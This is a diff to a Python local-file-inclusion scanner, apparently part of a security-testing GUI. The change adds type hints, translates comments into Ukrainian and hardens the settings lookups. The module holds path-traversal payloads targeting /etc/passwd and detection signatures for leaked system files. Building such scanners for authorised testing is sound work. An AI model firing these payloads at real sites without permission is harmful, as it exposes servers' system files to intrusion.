@@ -1,15 +1,17 @@
 # xss_security_gui/lfi_tester.py
+
 import time
 import requests
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+from typing import List, Dict, Any, Optional
 
 from xss_security_gui.settings import settings
 
 
 # -----------------------------------------
-# LFI payloads (можно расширять в settings)
+# LFI payloads (можна розширювати в settings)
 # -----------------------------------------
-DEFAULT_LFI_PAYLOADS = [
+DEFAULT_LFI_PAYLOADS: List[str] = [
     "../../etc/passwd",
     "../../../etc/passwd",
     "../../../../etc/passwd",
@@ -23,10 +25,13 @@ DEFAULT_LFI_PAYLOADS = [
 # -----------------------------------------
 # Вспомогательные функции
 # -----------------------------------------
-def build_lfi_url(base_url: str, param: str, payload: str) -> str:
-    """Формирует URL с подменённым параметром для LFI."""
+def build_lfi_url(base_url: str, param: str, payload: str) -> Optional[str]:
+    """
+    Формує URL з підміненою змінною параметра.
+    Повертає None, якщо параметра немає в URL.
+    """
     parsed = urlparse(base_url)
-    query = parse_qs(parsed.query)
+    query = parse_qs(parsed.query, keep_blank_values=True)
 
     if param not in query:
         return None
@@ -45,42 +50,59 @@ def build_lfi_url(base_url: str, param: str, payload: str) -> str:
 
 
 def is_suspicious_content(text: str) -> bool:
-    """Проверяет, содержит ли ответ признаки успешного LFI."""
+    """
+    Перевіряє, чи містить відповідь сигнатури LFI.
+    """
     text = text.lower()
 
-    signatures = settings.LFI_SIGNATURES or [
+    signatures = getattr(settings, "LFI_SIGNATURES", None) or [
         "root:x",          # /etc/passwd
         "[extensions]",    # win.ini
         "[fonts]",
-        "[drivers]"
+        "[drivers]",
     ]
 
     return any(sig in text for sig in signatures)
 
 
 # -----------------------------------------
-# Основной LFI‑тестер
+# Основний LFI‑тестер
 # -----------------------------------------
 def test_lfi_payloads(
     base_url: str,
     param: str = "file",
-    payloads: list[str] | None = None,
-    delay: float | None = None,
-    timeout: int | None = None
-):
+    payloads: Optional[List[str]] = None,
+    delay: Optional[float] = None,
+    timeout: Optional[int] = None
+) -> List[Dict[str, Any]]:
     """
-    Проверяет LFI уязвимость путём подстановки вредоносных payload'ов.
-    Возвращает список результатов.
+    Перевіряє LFI уразливість шляхом підстановки payload'ів.
+    Повертає список результатів у форматі:
+    {
+        "url": str,
+        "payload": str,
+        "status": int | "ERR",
+        "length": int,
+        "suspicious": bool,
+        "error": Optional[str]
+    }
     """
 
     if not base_url or not param:
-        raise ValueError("URL и параметр должны быть указаны")
+        raise ValueError("URL і параметр повинні бути вказані")
 
-    payloads = payloads or settings.LFI_PAYLOADS or DEFAULT_LFI_PAYLOADS
-    delay = delay if delay is not None else settings.LFI_DELAY
-    timeout = timeout if timeout is not None else settings.REQUEST_TIMEOUT
+    # Безпечне отримання payload-ів
+    payloads = (
+        payloads
+        or getattr(settings, "LFI_PAYLOADS", None)
+        or DEFAULT_LFI_PAYLOADS
+    )
 
-    results = []
+    # Таймінги
+    delay = delay if delay is not None else getattr(settings, "LFI_DELAY", 0.5)
+    timeout = timeout if timeout is not None else getattr(settings, "REQUEST_TIMEOUT", 10)
+
+    results: List[Dict[str, Any]] = []
 
     for payload in payloads:
         full_url = build_lfi_url(base_url, param, payload)
@@ -98,7 +120,7 @@ def test_lfi_payloads(
                 "payload": payload,
                 "status": resp.status_code,
                 "length": len(content),
-                "suspicious": suspicious
+                "suspicious": suspicious,
             })
 
         except Exception as e:
@@ -108,7 +130,7 @@ def test_lfi_payloads(
                 "status": "ERR",
                 "length": 0,
                 "suspicious": False,
-                "error": str(e)
+                "error": str(e),
             })
 
         time.sleep(delay)
@@ -117,7 +139,7 @@ def test_lfi_payloads(
 
 
 # -----------------------------------------
-# Тестовый запуск
+# Тестовий запуск
 # -----------------------------------------
 if __name__ == "__main__":
     base = "https://example.com/view.php?file=readme.txt"
